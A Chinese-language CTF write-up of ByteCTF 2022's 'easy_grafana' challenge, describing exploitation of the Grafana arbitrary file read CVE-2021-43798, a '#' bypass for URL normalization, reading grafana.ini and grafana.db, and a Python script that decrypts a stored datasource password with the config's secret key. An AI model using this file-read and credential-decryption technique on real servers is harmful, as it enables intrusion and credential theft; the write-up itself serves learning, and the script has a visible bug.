## web

被折磨了一早上还没做出来😭

**然后立誓，少打比赛，多复现！**

### easy_grafana

一看是个框架搭的网站，直接去搜该框架的漏洞发现**[CVE-2021-43798]**，可以任意文件读取

但是按原payload会报400，原因

> 目前已经部署的 Grafana 会有很多被 nginx/apache 等中间件反向代理的情况,有的中间件的 [URI_normalization](https://en.wikipedia.org/wiki/URI_normalization) 机制导致 URL 被标准化。

参考[grafana漏洞分析](https://blog.riskivy.com/grafana-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%8f%96%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e4%b8%8e%e6%b1%87%e6%80%bbcve-2021-43798/)

可用#绕过

![image-20220925222150354](D:\Typora\note\CTF\web\比赛wp\bytectf2022.assets\image-20220925222150354.png)

主要文件

```ABAP
/etc/grafana/grafana.ini配置
/var/lib/grafana/grafana.db数据库
```

直接读flag没文件，读**grafana**的数据库文件看到了一串神奇的密码

![image-20220925222258092](D:\Typora\note\CTF\web\比赛wp\bytectf2022.assets\image-20220925222258092.png)

但是不知道有什么用，而且被加密过(以为能连mysql的说，然后并不行...)

然后找`.bash_history`，直接没这个文件

然后就放弃了。。。

后面看pysnow师傅的wp发现flag就在那段密码里面...

解密就需要**key**，在配置文件中可找到

![image-20220925222844774](D:\Typora\note\CTF\web\比赛wp\bytectf2022.assets\image-20220925222844774.png)

这里给出了解密脚本

`https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798`

替换一下打印就行

```php
import base64
from hashlib import pbkdf2_hmac
from Crypto.Cipher import AES

saltLength = 8
aesCfb = "aes-cfb"
aesGcm = "aes-gcm"
encryptionAlgorithmDelimiter = '*'
nonceByteSize = 12

def decrypt(payload, secret):
    alg, payload, err = deriveEncryptionAlgorithm(payload)

    if err is not None:
        return None, err

    if len(payload) < saltLength:
        return None, "Unable to compute salt"

    salt = payload[:saltLength]
    key, err = encryptionKeyToBytes(secret, salt)

    if err is not None:
        return None, err

    if alg == aesCfb:
        return decryptCFB(payload, key)
    elif alg == aesGcm:
        return decryptGCM(payload, key)

    return None, None


def deriveEncryptionAlgorithm(payload):
    if len(payload) == 0:
        return "", None, "Unable to derive encryption"

    if payload[0] != encryptionAlgorithmDelimiter.encode():
        return aesCfb, payload, None

    payload = payload[:1]


def encryptionKeyToBytes(secret, salt):
    return pbkdf2_hmac("sha256", secret.encode("utf-8"), salt, 10000, 32), None


def decryptGCM(payload, key):
    nonce = payload[saltLength: saltLength+nonceByteSize]
    payload = payload[saltLength+nonceByteSize:]

    gcm = AES.new(key, AES.MODE_GCM, nonce, segment_size=128)

    return gcm.decrypt(payload).decode(), None


def decryptCFB(payload, key):
    if len(payload) < AES.block_size:
        return None, "Payload too short"

    iv = payload[saltLength: saltLength + AES.block_size]
    payload = payload[saltLength+AES.block_size:]

    cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)

    return cipher.decrypt(payload).decode(), None

if __name__ == "__main__":
    grafanaIni_secretKey = "SW2YcwTIb9zpO1hoPsMm"
    dataSourcePassword = "b0NXeVJoSXKPoSYIWt8i/GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6/"

    encrypted = base64.b64decode(dataSourcePassword.encode())
    pwdBytes, _ = decrypt(encrypted, grafanaIni_secretKey)
    print(pwdBytes)
```

![image-20220925222953587](D:\Typora\note\CTF\web\比赛wp\bytectf2022.assets\image-20220925222953587.png)

<font color='pink'>**只能说见识太少了**</font>